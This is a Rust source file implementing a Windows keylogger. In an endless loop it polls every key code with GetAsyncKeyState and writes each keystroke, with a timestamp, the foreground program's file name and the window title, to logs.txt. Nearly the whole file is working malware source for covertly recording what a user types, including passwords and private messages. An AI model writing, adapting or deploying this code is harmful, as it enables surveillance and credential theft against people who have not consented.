extern crate winapi;

use std::{
    fs::{File, OpenOptions},
    thread,
    time::Duration,
};

use winapi::ctypes::c_int;
use winapi::shared::minwindef::DWORD;
use winapi::um::processthreadsapi::OpenProcess;
use winapi::um::psapi::GetProcessImageFileNameW;
use winapi::um::winnt::PROCESS_QUERY_LIMITED_INFORMATION;
use winapi::um::winuser::*;

use chrono::{DateTime, Timelike, Utc};

use crate::utils;

fn run(file: &mut File) {
    // We add a line to specify that a reboot has happened (or that the process was regenerated)
    utils::log(file, "\nKeylogs:\n".to_string());

    // Endless loop of logging.
    loop {
        // We sleep the thread for 10 ms at every loop to save resources.
        thread::sleep(Duration::from_millis(10));

        // Get the foreground window, we assume it is where the keys were pressed.
        // https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getforegroundwindow
        /* GetForegroundWindow: Retrieves a handle to the foreground window (the window with which the user is currently working). The system assigns a slightly higher priority to the thread that creates the foreground window than it does to other threads. */
        let hwnd = unsafe { GetForegroundWindow() };

        // Get the foreground window's process PID.
        // https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getwindowthreadprocessid
        /* GetWindowThreadProcessId: Retrieves the identifier of the thread that created the specified window and, optionally, the identifier of the process that created the window. */
        let pid = unsafe {
            let mut pid = 0 as DWORD;
            GetWindowThreadProcessId(hwnd, &mut pid);
            pid
        };

        // Get the HANDLE of the foreground process.
        // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
        /* OpenProcess: Opens an existing local process object. */
        let handle = unsafe { OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, pid) };

        // Get the filename of the foreground window's process.
        // https://learn.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-getprocessimagefilenamew
        /* Retrieves the name of the executable file for the specified process. */
        let filename = unsafe {
            const LEN: u32 = 256;
            let mut buf = vec![0 as u16; LEN as usize];
            GetProcessImageFileNameW(handle, buf.as_mut_ptr(), LEN);

            // Find the null terminator.
            let mut len = 0;
            buf.iter().enumerate().for_each(|(i, c)| {
                if *c == 0 && len == 0 {
                    len = i;
                }
            });

            String::from_utf16_lossy(buf[0..len].as_mut())
        };

        let title = unsafe {
            // Get windows title character length.
            // https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getwindowtextlengthw
            /* Retrieves the length, in characters, of the specified window's title bar text (if the window has a title bar). If the specified window is a control, the function retrieves the length of the text within the control. However, GetWindowTextLength cannot retrieve the length of the text of an edit control in another application. */
            let len = GetWindowTextLengthW(hwnd) + 1;
            let mut title = String::from("__NO_TITLE__");

            // Get the title of the current foreground window.
            // https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getwindowtextw
            /* Copies the text of the specified window's title bar (if it has one) into a buffer. If the specified window is a control, the text of the control is copied. However, GetWindowText cannot retrieve the text of a control in another application. */
            if len > 0 {
                let mut buf = vec![0 as u16; len as usize];
                GetWindowTextW(hwnd, buf.as_mut_ptr(), len as i32);
                buf.remove(buf.len() - 1);
                title = String::from_utf16_lossy(buf.as_mut());
            }
            title
        };

        let now: DateTime<Utc> = Utc::now();

        // loop over all possible keys.
        for i in 0 as c_int..255 as c_int {
            // Get if the [i] Key is pressed or not.
            // https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getasynckeystate
            /* Determines whether a key is up or down at the time the function is called, and whether the key was pressed after a previous call to GetAsyncKeyState. */
            let key = unsafe { GetAsyncKeyState(i) };

            if (key & 1) > 0 {
                let s = format!(
                    "[{:02}:{:02}:{:02}][{}][{}][{}]\n",
                    now.hour(),
                    now.minute(),
                    now.second(),
                    filename.trim(),
                    title.trim(),
                    utils::keycode_to_string(i as u8)
                );

                utils::log(file, s);
            }
        }
    }
}

pub fn keylog_all() {
    let filename = "logs.txt";

    // We try to create a file.
    let mut output = {
        match OpenOptions::new().append(true).create(true).open(&filename) {
            Ok(f) => f,
            Err(e) => {
                panic!("Couldn't create Output file: {}", e);
            }
        }
    };

    // We enter the endless loop of logging.
    run(&mut output);
}
